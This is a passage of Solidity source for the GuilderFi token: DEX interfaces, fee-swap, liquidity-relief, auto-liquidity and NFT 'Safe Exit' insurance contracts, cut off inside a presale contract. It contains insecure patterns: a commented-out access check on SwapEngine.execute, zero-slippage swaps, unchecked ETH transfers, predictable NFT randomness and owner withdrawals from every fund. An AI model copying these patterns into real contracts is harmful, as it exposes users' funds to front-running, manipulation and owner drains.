    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface IDexFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface IGuilderFi {
      
    // Events
    event LogRebase(
        uint256 indexed epoch,
        uint256 totalSupply,
        uint256 pendingRebases
    );

    // Fee struct
    struct Fee {
        uint256 treasuryFee;
        uint256 lrfFee;
        uint256 liquidityFee;
        uint256 safeExitFee;
        uint256 burnFee;
        uint256 totalFee;
    }

    // Rebase functions
    function rebase() external;
    function getRebaseRate() external view returns (uint256);
    function pendingRebases() external view returns (uint256);
    function maxRebaseBatchSize() external view returns (uint256);
    
    // Transfer
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    // Allowance
    function allowance(address owner_, address spender) external view returns (uint256);
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);

    // Smart Contract Settings
    function openTrade() external;
    function launchToken() external;
    function setAutoSwap(bool _flag) external;
    function setAutoAddLiquidity(bool _flag) external;
    function setAutoRebase(bool _flag) external;
    function setAutoLiquidityFrequency(uint256 _frequency) external;
    function setLrfFrequency(uint256 _frequency) external;
    function setSwapFrequency(uint256 _frequency) external;    
    function setMaxRebaseBatchSize(uint256 _maxRebaseBatchSize) external;
    function setDex(address routerAddress) external;
    function setAddresses(
        address treasuryAddress,
        address lrfAddress,
        address autoLiquidityAddress,
        address safeExitFundAddress,
        address burnAddress
    ) external;
    function setFees(
        bool _isSellFee,
        uint256 _treasuryFee,
        uint256 _lrfFee,
        uint256 _liquidityFee,
        uint256 _safeExitFee,
        uint256 _burnFee
    ) external;

    // Address settings
    function setFeeExempt(address _address, bool _flag) external;
    function setBlacklist(address _address, bool _flag) external;
    function allowPreSaleTransfer(address _addr, bool _flag) external;

    // Read only functions
    function isPreSale() external view returns (bool);
    function hasLaunched() external view returns (bool);
    function getCirculatingSupply() external view returns (uint256);
    function checkFeeExempt(address _addr) external view returns (bool);
    function isNotInSwap() external view returns (bool);

    // Addresses
    function getOwner() external view returns (address);
    function getTreasuryAddress() external view returns (address);
    function getLrfAddress() external view returns (address);
    function getAutoLiquidityAddress() external view returns (address);
    function getSafeExitFundAddress() external view returns (address);
    function getPreSaleAddress() external view returns (address);
    function getBurnAddress() external view returns (address);

    // Setting flags
    function swapEnabled() external view returns (bool);
    function autoRebaseEnabled() external view returns (bool);
    function autoAddLiquidityEnabled() external view returns (bool);
    function lrfEnabled() external view returns (bool);

    // Date/time stamps
    function initRebaseStartTime() external view returns (uint256);
    function lastRebaseTime() external view returns (uint256);
    function lastAddLiquidityTime() external view returns (uint256);
    function lastLrfExecutionTime() external view returns (uint256);
    function lastSwapTime() external view returns (uint256);
    function lastEpoch() external view returns (uint256);

    // Dex addresses
    function getRouter() external view returns (address);
    function getPair() external view returns (address);

    // Standard ERC20 functions
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external pure returns (uint8);
    
    function manualSync() external;
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./interfaces/IGuilderFi.sol";
import "./interfaces/ISwapEngine.sol";
import "./interfaces/IDexPair.sol";
import "./interfaces/IDexRouter.sol";

contract SwapEngine is ISwapEngine {

    using SafeMath for uint256;

    // GuilderFi token contract address
    IGuilderFi internal _token;
 
    // enabled flag
    bool internal _isEnabled = true;

    // FEES COLLECTED
    uint256 internal _treasuryFeesCollected;
    uint256 internal _lrfFeesCollected;
    uint256 internal _safeExitFeesCollected;

    // PRIVATE FLAGS
    bool private _isRunning = false;
    modifier running() {
        _isRunning = true;
        _;
        _isRunning = false;
    }

    modifier onlyToken() {
        require(msg.sender == address(_token), "Sender is not token contract"); _;
    }

    modifier onlyTokenOwner() {
        require(msg.sender == address(_token.getOwner()), "Sender is not token owner"); _;
    }

    constructor () {
        _token = IGuilderFi(msg.sender);
    }

    // External execute function
    function execute() override external { //onlyToken {
        if (shouldExecute()) {
            _execute();
        }
    }

    // External execute function
    function recordFees(uint256 lrfAmount, uint256 safeExitAmount, uint256 treasuryAmount) override external onlyToken {
        _lrfFeesCollected = _lrfFeesCollected.add(lrfAmount);
        _safeExitFeesCollected = _safeExitFeesCollected.add(safeExitAmount);
        _treasuryFeesCollected = _treasuryFeesCollected.add(treasuryAmount);
    }

    function shouldExecute() internal view returns (bool) {
        return !_isRunning && _isEnabled;
    }

    function _execute() internal running {

        IDexRouter _router = getRouter();
        uint256 totalGonFeesCollected = _treasuryFeesCollected.add(_lrfFeesCollected).add(_safeExitFeesCollected);
        uint256 amountToSwap = _token.balanceOf(address(this));

        if (amountToSwap == 0) {
            return;
        }

        uint256 balanceBefore = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = _router.WETH();

        // swap all tokens in contract for ETH
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 treasuryETH = amountETH.mul(_treasuryFeesCollected).div(totalGonFeesCollected);
        uint256 safeExitETH = amountETH.mul(_safeExitFeesCollected).div(totalGonFeesCollected);
        uint256 lrfETH = amountETH.sub(treasuryETH).sub(safeExitETH);

        _treasuryFeesCollected = 0;
        _lrfFeesCollected = 0;
        _safeExitFeesCollected = 0;
        
        // send eth to treasury
        (bool success, ) = payable(_token.getTreasuryAddress()).call{ value: treasuryETH }("");

        // send eth to lrf
        (success, ) = payable(_token.getLrfAddress()).call{ value: lrfETH }("");

        // send eth to safe exit fund
        (success, ) = payable(_token.getSafeExitFundAddress()).call{ value: safeExitETH }("");
    }

    function getRouter() internal view returns (IDexRouter) {
        return IDexRouter(_token.getRouter());
    }

    function getPair() internal view returns (IDexPair) {
        return IDexPair(_token.getPair());
    }

    function isEnabled() public view override returns (bool) {
        return _isEnabled;
    }

    function setEnabled(bool _enable) external override onlyTokenOwner {
        _isEnabled = _enable;
    }

    function withdraw(uint256 amount) external override onlyTokenOwner {
        payable(msg.sender).transfer(amount);
    }
    
    function withdrawTokens(address token, uint256 amount) external override onlyTokenOwner {
        IERC20(token).transfer(msg.sender, amount);
    }

    receive() external payable {}
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./interfaces/IGuilderFi.sol";
import "./interfaces/ILiquidityReliefFund.sol";
import "./interfaces/IDexPair.sol";
import "./interfaces/IDexRouter.sol";

contract LiquidityReliefFund is ILiquidityReliefFund {

    using SafeMath for uint256;

    // GuilderFi token contract address
    IGuilderFi internal _token;

    uint256 public constant ACCURACY_FACTOR = 10 ** 18;
    uint256 public constant PERCENTAGE_ACCURACY_FACTOR = 10 ** 4;

    uint256 public constant ACTIVATION_TARGET = 10000; // 100.00%
    uint256 public constant LOW_CAP = 8500; // 85.00%
    uint256 public constant HIGH_CAP = 11500; // 115.00%

    address public pairAddress;
    bool internal _hasReachedActivationTarget = false; 
    bool internal _enabled = true;

    // PRIVATE FLAGS
    bool private _isRunning = false;
    modifier running() {
        _isRunning = true;
        _;
        _isRunning = false;
    }

    modifier onlyToken() {
        require(msg.sender == address(_token), "Sender is not token contract"); _;
    }

    modifier onlyTokenOwner() {
        require(msg.sender == address(_token.getOwner()), "Sender is not token owner"); _;
    }

    constructor () {
        _token = IGuilderFi(msg.sender);
    }

    // External execute function
    function execute() override external onlyToken {
        
        // TODO: refactor so backed liquidity ratio is not calculated over and over
        if (!_hasReachedActivationTarget) {
            uint256 backedLiquidityRatio = getBackedLiquidityRatio();

            if (backedLiquidityRatio >= ACTIVATION_TARGET) {
                _hasReachedActivationTarget = true;
            }
        }

        if (shouldExecute()) {
            _execute();
        }
    }

    function shouldExecute() internal view returns (bool) {
        uint256 backedLiquidityRatio = getBackedLiquidityRatio();

        return
            _hasReachedActivationTarget &&
            !_isRunning &&
            _enabled &&
            backedLiquidityRatio <= HIGH_CAP &&
            backedLiquidityRatio >= LOW_CAP;
    }

    function _execute() internal running {
        uint256 backedLiquidityRatio = getBackedLiquidityRatio();

        // TODO check if LOW cap has been hit before running
        // TODO add code to check if should run (e.g. 2 day window)
        if (backedLiquidityRatio == 0) {
            return;
        }

        if (backedLiquidityRatio > HIGH_CAP) {
            buyTokens();
        }
        else if (backedLiquidityRatio < LOW_CAP) {
            sellTokens();
        }
    }

    function buyTokens() internal {
        if (address(this).balance == 0) {
            return;
        }

        IDexRouter router = getRouter();
        uint256 totalTreasuryAssetValue = getTotalTreasuryAssetValue();
        (uint256 liquidityPoolEth, ) = getLiquidityPoolReserves();
        uint256 ethToBuy = (totalTreasuryAssetValue.sub(liquidityPoolEth)).div(2);

        if (ethToBuy > address(this).balance) {
            ethToBuy = address(this).balance;
        }


        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(_token);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{ value: ethToBuy }(
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function sellTokens() internal {
        uint256 tokenBalance = _token.balanceOf(address(this)); 
        if (tokenBalance == 0) {
            return;
        }

        IDexRouter router = getRouter();
        uint256 totalTreasuryAssetValue = getTotalTreasuryAssetValue();
        (uint256 liquidityPoolEth, uint256 liquidityPoolTokens) = getLiquidityPoolReserves();
        
        uint256 valueDiff = ACCURACY_FACTOR.mul(liquidityPoolEth.sub(totalTreasuryAssetValue));
        uint256 tokenPrice = ACCURACY_FACTOR.mul(liquidityPoolEth).div(liquidityPoolTokens);
        uint256 tokensToSell = valueDiff.div(tokenPrice.mul(2));

        if (tokensToSell > tokenBalance) {
            tokensToSell = tokenBalance;
        }

        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensToSell,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getBackedLiquidityRatio() public view returns (uint256) {
        (uint256 liquidityPoolEth, ) = getLiquidityPoolReserves();
        if (liquidityPoolEth == 0) {
            return 0;
        }

        uint256 totalTreasuryAssetValue = getTotalTreasuryAssetValue();
        uint256 ratio = PERCENTAGE_ACCURACY_FACTOR.mul(totalTreasuryAssetValue).div(liquidityPoolEth);
        return ratio;
    }

    function getTotalTreasuryAssetValue() internal view returns (uint256) {
        uint256 treasuryEthBalance = address(_token.getTreasuryAddress()).balance;
        return treasuryEthBalance.add(address(this).balance);
    }

    function getLiquidityPoolReserves() internal view returns (uint256, uint256) {
        IDexPair pair = getPair();
        address token0Address = pair.token0();
        (uint256 token0Reserves, uint256 token1Reserves, ) = pair.getReserves();
        
        // returns eth reserves, token reserves
        return token0Address == address(_token) ?
            (token1Reserves, token0Reserves) :
            (token0Reserves, token1Reserves);
    }

    function getRouter() internal view returns (IDexRouter) {
        return IDexRouter(_token.getRouter());
    }

    function getPair() internal view returns (IDexPair) {
        return IDexPair(_token.getPair());
    }

    function withdraw(uint256 amount) external override onlyTokenOwner{
        payable(msg.sender).transfer(amount);
    }
    
    function withdrawTokens(address token, uint256 amount) external override onlyTokenOwner {
        IERC20(token).transfer(msg.sender, amount);
    }

    receive() external payable {}
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./interfaces/IGuilderFi.sol";
import "./interfaces/IAutoLiquidityEngine.sol";
import "./interfaces/IDexPair.sol";
import "./interfaces/IDexRouter.sol";

contract AutoLiquidityEngine is IAutoLiquidityEngine {

    using SafeMath for uint256;

    // GuilderFi token contract address
    IGuilderFi internal _token;
 
    bool internal _enabled = true;

    // PRIVATE FLAGS
    bool private _isRunning = false;
    modifier running() {
        _isRunning = true;
        _;
        _isRunning = false;
    }

    modifier onlyToken() {
        require(msg.sender == address(_token), "Sender is not token contract"); _;
    }

    modifier onlyTokenOwner() {
        require(msg.sender == address(_token.getOwner()), "Sender is not token owner"); _;
    }

    constructor () {
        _token = IGuilderFi(msg.sender);
    }

    // External execute function
    function execute() override external onlyToken {
        if (shouldExecute()) {
            _execute();
        }
    }

    function shouldExecute() internal view returns (bool) {
        return
            !_isRunning &&
            _enabled;
    }

    function test() external view returns (uint256) {
        uint256 autoLiquidityAmount = _token.balanceOf(address(this));

        // calculate 50/50 split
        uint256 amountToLiquify = autoLiquidityAmount.div(2);
        uint256 amountToSwap = autoLiquidityAmount.sub(amountToLiquify);

        return amountToSwap;
    }

    function _execute() internal running {        
        // transfer all tokens from liquidity account to contract
        uint256 autoLiquidityAmount = _token.balanceOf(address(this));

        // calculate 50/50 split
        uint256 amountToLiquify = autoLiquidityAmount.div(2);
        uint256 amountToSwap = autoLiquidityAmount.sub(amountToLiquify);

        if( amountToSwap == 0 ) {
            return;
        }
        
        IDexRouter router = getRouter();

        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = router.WETH();

        uint256 balanceBefore = address(this).balance;

        // swap tokens for ETH
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETHLiquidity = address(this).balance.sub(balanceBefore);

        // add tokens + ETH to liquidity pool
        if (amountToLiquify > 0 && amountETHLiquidity > 0) {
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(_token),
                amountToLiquify,
                0,
                0,
                _token.getTreasuryAddress(),
                block.timestamp
            );
        }
    }

    function getRouter() internal view returns (IDexRouter) {
        return IDexRouter(_token.getRouter());
    }

    function getPair() internal view returns (IDexPair) {
        return IDexPair(_token.getPair());
    }

    function withdraw(uint256 amount) external override onlyTokenOwner{
        payable(msg.sender).transfer(amount);
    }
    
    function withdrawTokens(address token, uint256 amount) external override onlyTokenOwner {
        IERC20(token).transfer(msg.sender, amount);
    }

    receive() external payable {}
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

import "./interfaces/IGuilderFi.sol";
import "./interfaces/ISafeExitFund.sol";
import "./interfaces/IDexPair.sol";

contract SafeExitFund is ISafeExitFund, ERC721Enumerable {
  using SafeMath for uint256;
  using Counters for Counters.Counter;
  Counters.Counter private _tokenId;

  address private constant DEAD = 0x000000000000000000000000000000000000dEaD;

  struct InsuranceStatus {
    uint256 walletPurchaseAmount;
    uint256 payoutAmount;
    uint256 maxInsuranceAmount;
    uint256 premiumAmount;
    uint256 finalPayoutAmount;
  }

  struct Package {
    uint256 packageId;
    uint256 maxInsuranceAmount;
    string metadataUri;
  }

  struct PackageChancePercentage {
    uint256 packageId;
    uint256 chancePercentage;
  }

  mapping(uint256 => Package) private packages;
  PackageChancePercentage[] private packageChances;

  // bonus
  uint256 private bonusNumerator = 625; // 6.25%
  uint256 private constant BONUS_DENOMINATOR = 10000; 

  // max nft supply
  uint256 private _maxSupply = 5000;

  // metadata uri's
  string private _unrevealedMetadataUri = "";
  string private _usedMetadataUri = "";

  // lottery
  bool private randomSeedHasBeenSet = false;
  uint256 private randomSeed = 123456789;
  uint256 private timestampSalt = 123456789;

  // maps
  mapping(address => uint256) private purchaseAmount;
  mapping(uint256 => bool) private isUsed;
  mapping(uint256 => uint256) private _customLimit;

  // date when safeexit can be claimed
  uint256 private _activationDate;

  // GuilderFi token contract address
  IGuilderFi internal token;

  modifier onlyToken() {
    require(msg.sender == address(token), "Sender is not token contract");
    _;
  }

  modifier onlyTokenOwner() {
    require(msg.sender == address(token.getOwner()), "Sender is not token owner");
    _;
  }

  modifier onlyPresale() {
    require(msg.sender == token.getPreSaleAddress(), "Sender is not presale contract");
    _;
  }

  modifier onlyTokenOwnerOrPresale() {
    require(msg.sender == address(token.getOwner()) || msg.sender == token.getPreSaleAddress(), "Sender is not token or presale");
    _;
  }

  modifier nftsRevealed() {
    require(randomSeedHasBeenSet == true, "NFTs are not revealed yet");
    _;
  }

  constructor() ERC721("Safe Exit Fund", "SEF") {
    token = IGuilderFi(msg.sender);

    // Set max insurance amount of each NFT package
    packages[1] = Package(1, 25 ether, "");
    packages[2] = Package(2, 10 ether, "");
    packages[3] = Package(3, 5 ether, "");
    packages[4] = Package(4, 2 ether, "");

    // Set % chances of receiving each NFT package
    packageChances.push(PackageChancePercentage(1, 25));
    packageChances.push(PackageChancePercentage(2, 25));
    packageChances.push(PackageChancePercentage(3, 25));
    packageChances.push(PackageChancePercentage(4, 25));    
  }

  /**
   * External function executed with every main contract transaction,
   */
  function execute(
    address sender,
    address recipient,
    uint256 tokenAmount
  ) external override onlyToken {
    // if sender == pair, then this is a buy transaction
    if (sender == token.getPair()) {
      capturePurchaseAmount(recipient, tokenAmount);
    }
    else {
      // reset insured amount to zero when user sells/transfers tokens
      resetInsuredAmount(sender);
    }
  }

  /**
   * When a user purchases tokens from the exchange, calculate the current
   * price of the token (in eth/coins) and record it
   */
  function capturePurchaseAmount(address _walletAddress, uint256 _tokenAmount) internal onlyToken {
    if (_tokenAmount <= 0) return;

    (uint256 ethReserves, uint256 tokenReserves) = getLiquidityPoolReserves();
    
    // calculate eth spent based on current liquidity pool reserves
    uint256 ethSpent = _tokenAmount.mul(ethReserves).div(tokenReserves);

    purchaseAmount[_walletAddress] = purchaseAmount[_walletAddress].add(ethSpent);
  }

  function capturePresalePurchaseAmount(address _walletAddress, uint256 _amount) external override onlyPresale {
    purchaseAmount[_walletAddress] = purchaseAmount[_walletAddress].add(_amount);
  }

  function resetInsuredAmount(address _walletAddress) internal {
    purchaseAmount[_walletAddress] = 0;
  }

  /**
   * Use all the NFTs in a user's wallet giving the insured amount to the user.
   * Called by the user in case they want the insured amount back
   */
  function claimSafeExit() external override {
    require(block.timestamp > _activationDate, "SafeExit not available yet");

    (, , , , uint256 finalPayoutAmount) = getInsuranceStatus(msg.sender);

    resetInsuredAmount(msg.sender);

    for (uint256 i = 0; i < balanceOf(msg.sender); i++) {
      uint256 nftId = tokenOfOwnerByIndex(msg.sender, i);
      isUsed[nftId] = true;
    }

    // transfer
    require(address(this).balance >= finalPayoutAmount, "Insufficient SafeExit funds");
    payable(msg.sender).transfer(finalPayoutAmount);

    // burn user's tokens (will need user to pre-approve safe exit to run transferFrom)
    token.transferFrom(msg.sender, DEAD, token.balanceOf(msg.sender));
  }

  function mintRandom(address _walletAddress) external override onlyPresale {
    uint256 tokenId = _tokenId.current();
    require(tokenId < _maxSupply, "Cannot mint more NFTs");
    _mint(_walletAddress, tokenId);
    _tokenId.increment();
  }

  function mint(address _walletAddress, uint256 _maxInsuranceAmount) external override onlyTokenOwner {
    uint256 tokenId = _tokenId.current();
    require(tokenId < _maxSupply, "Cannot mint more NFTs");
    _mint(_walletAddress, tokenId);
    _customLimit[tokenId] = _maxInsuranceAmount;
    _tokenId.increment();
  }  

  /**
   * Public getter functions
   */
  function maxSupply() public override view returns (uint256) { return _maxSupply; }
  function unrevealedMetadataUri() public override view returns (string memory) { return _unrevealedMetadataUri; }
  function usedMetadataUri() public override view returns (string memory) { return _usedMetadataUri; }
  function activationDate() public override view returns (uint256) { return _activationDate; }
  function issuedTokens() public override view returns (uint256) { return _tokenId.current(); }

  function tokenURI(uint256 _nftId) public view override(ISafeExitFund, ERC721) returns (string memory) {
    require(_exists(_nftId), "Token does not exist");

    if (!randomSeedHasBeenSet) {
      return _unrevealedMetadataUri;
    }

    if (isUsed[_nftId]) {
      return _usedMetadataUri;
    }

    (, , string memory metadataUri) = getPackage(_nftId);
    return metadataUri;
  }

  /**
   * Gets the package given a token ID.
   * The value of the package is determined via a random seed 
   */
  function getPackage(uint256 _nftId) public override view nftsRevealed returns (
    uint256 packageId,
    uint256 maxInsuranceAmount,
    string memory metadataUri
  ) {
    // using timestamp salt & random seed & nftId we get a pseudo random number between 0 and 99
    uint256 randomNum = uint256(keccak256(abi.encodePacked(timestampSalt, randomSeed, _nftId))) % 100;

    uint256 rangeFrom = 0;
    uint256 rangeTo = 0;

    for (uint256 i = 0; i < packageChances.length; i++) {
      rangeTo = rangeFrom + packageChances[i].chancePercentage;

      if (randomNum >= rangeFrom && randomNum < rangeTo) {
        // found matching package, return results
        Package memory package = packages[packageChances[i].packageId];
        
        packageId = package.packageId;
        maxInsuranceAmount = package.maxInsuranceAmount;
        metadataUri = package.metadataUri;

        return (packageId, maxInsuranceAmount, metadataUri);
      }

      rangeFrom += packageChances[i].chancePercentage;
    }

    // if no package found, return empty package data
    packageId = 0;
    maxInsuranceAmount = 0;
    metadataUri = "";
  }

  function getInsuranceStatus(address _walletAddress) public override view nftsRevealed returns (
    uint256 totalPurchaseAmount,
    uint256 maxInsuranceAmount,
    uint256 payoutAmount,
    uint256 premiumAmount,
    uint256 finalPayoutAmount    
    ) {
    
    totalPurchaseAmount = purchaseAmount[_walletAddress];
    maxInsuranceAmount = getTotalInsurance(_walletAddress);

    payoutAmount = (totalPurchaseAmount > maxInsuranceAmount) ? maxInsuranceAmount : totalPurchaseAmount;

    // add premium
    premiumAmount = payoutAmount.mul(bonusNumerator).div(BONUS_DENOMINATOR);
    finalPayoutAmount = payoutAmount.add(premiumAmount);
  }

  /**
   * Internal getter functions
   */
  function getTotalInsurance(address _walletAddress) internal view returns (uint256) {
    uint256 totalInsurance = 0;

    for (uint256 i = 0; i < balanceOf(_walletAddress); i++) {
      uint256 nftId = tokenOfOwnerByIndex(_walletAddress, i);

      // first check if NFT has been used
      if (!isUsed[nftId]) {

        // if not, check for override
        if (_customLimit[nftId] > 0) {
          totalInsurance = totalInsurance.add(_customLimit[nftId]);
        }
        else {
          // if not override, use package data
          (, uint256 maxInsuranceAmount, ) = getPackage(nftId);
          totalInsurance = totalInsurance.add(maxInsuranceAmount);
        }
      }
    }

    return totalInsurance;
  }

  function getLiquidityPoolReserves() internal view returns (uint256, uint256) {
    IDexPair pair = IDexPair(token.getPair());
    address token0Address = pair.token0();
    (uint256 token0Reserves, uint256 token1Reserves, ) = pair.getReserves();
    
    // returns eth reserves, token reserves
    return token0Address == address(token) ?
        (token1Reserves, token0Reserves) :
        (token0Reserves, token1Reserves);
  }

  /**
   * Launch Safe Exit - reveal all NFT packages using a random seed
   */
  function setRandomSeed(uint256 _randomSeed) external override onlyTokenOwner {
    // can only be called once
    if (!randomSeedHasBeenSet) {
      randomSeed = _randomSeed;
      timestampSalt = block.timestamp;

      // ensure random seed can only be set once
      randomSeedHasBeenSet = true;
    }
  }

  /**
   * Other external override setter functions
   */
  function setMaxSupply(uint256 newMaxSupply) external override onlyTokenOwner {
    _maxSupply = newMaxSupply;
  }

  function setCustomInsuranceLimit(uint256 _nftId, uint256 _limit) public override onlyTokenOwner {
    _customLimit[_nftId] = _limit;
  }

  function setMetadataUri(uint256 _packageId, string memory _uri) external override onlyTokenOwner {
    require(_packageId <= 4, "NFT package index not found"); // TODO - fix
    packages[_packageId].metadataUri = _uri;
  }

  function setUnrevealedMetadataUri(string memory _uri) external override onlyTokenOwner {
    _unrevealedMetadataUri = _uri;
  }
  
  function setUsedMetadataUri(string memory _uri) external override onlyTokenOwner {
    _usedMetadataUri = _uri;
  }

  function setActivationDate(uint256 _date) external override onlyTokenOwnerOrPresale {
    _activationDate = _date;
  }

  function withdraw(uint256 amount) external override onlyTokenOwner{
      payable(msg.sender).transfer(amount);
  }
  
  function withdrawTokens(address _tokenAddress, uint256 amount) external override onlyTokenOwner {
      IERC20(_tokenAddress).transfer(msg.sender, amount);
  }

  receive() external payable {}
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "./interfaces/IGuilderFi.sol";
import "./interfaces/ISafeExitFund.sol";
import "./interfaces/ILocker.sol";
import "./interfaces/IDexRouter.sol";
import "./interfaces/IPreSale.sol";
import "./interfaces/ISafeExitFund.sol";
import "./Locker.sol";

contract PreSale is IPreSale {

  using SafeMath for uint256;

  struct Tier {
    uint256 tierId;
    uint256 minAmount;
    uint256 maxAmount;
    uint256 tokensPerEth;
  }

  // tiers
  Tier private tier1 = Tier(1, 37.5 ether, 125 ether, 731.71 ether);
  Tier private tier2 = Tier(2, 7.5 ether, 25 ether, 750 ether);
  Tier private tier3 = Tier(3, 1.5 ether, 5 ether, 769.23 ether);
  Tier private tier4 = Tier(4, 0.3 ether, 1 ether, 789.47 ether);
  Tier private publicSale = Tier(0, 3 ether, 10 ether, 759.49 ether);
  
  // tiers array
  Tier[] private tiers;

  // constants
  uint256 private constant MAX_UINT256 = ~uint256(0);

  // maps/arrays
  mapping(address => uint256) private whitelist;
  mapping(address => ILocker) private _lockers;
  mapping(address => uint256) private _purchaseAmount;
  mapping(address => bool) private _refundClaimed;

  // settings
  mapping(uint256 => bool) private _isSaleOpen;
